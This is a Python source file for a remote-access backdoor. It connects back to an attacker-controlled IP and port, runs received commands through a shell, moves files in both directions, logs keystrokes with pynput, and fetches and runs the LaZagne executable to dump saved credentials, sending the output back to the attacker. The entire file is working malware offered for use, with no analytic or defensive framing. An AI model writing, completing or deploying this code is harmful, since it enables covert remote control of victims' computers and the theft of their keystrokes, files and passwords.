import socket,json,subprocess,base64,os,requests,logging,threading
from pynput.keyboard import Key,Listener
import tempfile


class Backdoor:

    def __init__(self,ip,port):
            try:

                self.conn=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                self.conn.connect((ip,port))
            except:
                 print("[-]Socket connection failed")

    def receive(self):
         json_result=''
         while True:
              try:
                   json_result+=self.conn.recv(1024).decode()
                   result =json.loads(json_result)
                   return result
              except Exception as e:
                   continue
              
    def send(self,data):
        data=base64.b64encode(data)
        json_data=json.dumps(data.decode())
        self.conn.send(json_data.encode())

    def execute_remote_command(self,command):
         try:
            return subprocess.check_output(command,shell=True)
         except Exception:
            return b"[-]failed to execute command"
         
    def change_working_directory(self,command):
         try:
              os.chdir(command.split(' ')[1])
              return b"[+]directory changed"
         except Exception:
              return b"[+]failed to change directory"
              
              
         
    def download_file(self,path):
         try:
          with open(path, 'rb') as file:
               return base64.b64encode(file.read())
         except Exception:
             return b"[-]File not found"
         
    def keyscan_start(self):
        logging.basicConfig(filename=("keylog.txt"),level = logging.DEBUG, format="%(asctime)s %(message)s")

        def on_press(key):
            logging.info(str(key))

        with Listener(on_press=on_press) as listener:
            listener.join()

    def keyscan_dump(self):
        result = self.download_file("keylog.txt")
        return


    def upload_file(self,path,content):
         try:
          with open(path, 'wb') as file:
               file.write(base64.b64decode(content))
               return b"[+] file uploaded"
         except Exception:
             return b"[-]File write error"
         
     
    def creds_dump(self):
        url="https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"
        content=requests.get(url).content
        pwd=os.getcwd()
        os.chdir(tempfile.gettempdir())
        with open('LaZagne.exe','wb') as file:
            file.write(content)
            result = subprocess.check_output("laZagne.exe all",shell=True)
            os.remove("LaZagne.exe")
            os.chdir(pwd)
            return result

             
    
    def run(self):
         while True:
              try:
                   data =self.receive()
                   if(data.split(' ')[0]=='cd'):
                    result=self.change_working_directory(data)
                   elif(data.split(' ')[0]=='download'):
                    result=self.download_file(data.split(' ')[1])
                   elif(data.split(' ')[0]=='keyscan_start'):
                    result=b"[+]keyscan started"
                    t = threading.Thread(target=self.keyscan_start,daemon=True)
                    t.start()
                   elif(data.split(' ')[0]=='keyscan_dump'):
                    result=self.keyscan_dump()
                   elif(data.split(' ')[0]=='upload'):
                    result=self.upload_file(data.split(' ')[1],data.split(' ')[2])
                   elif(data.split(' ')[0]=='creds_dump'):
                    result=self.creds_dump()
                   elif(data.split(' ')[0]=='exit'):
                    self.conn.close()
                    exit(0)
                   else:
                    result=self.execute_remote_command(data)
                   
                   self.send(result)
              except KeyboardInterrupt:
                   exit(0)

backdoor= Backdoor('192.168.1.101',4444)#enter attacking machine ip
backdoor.run()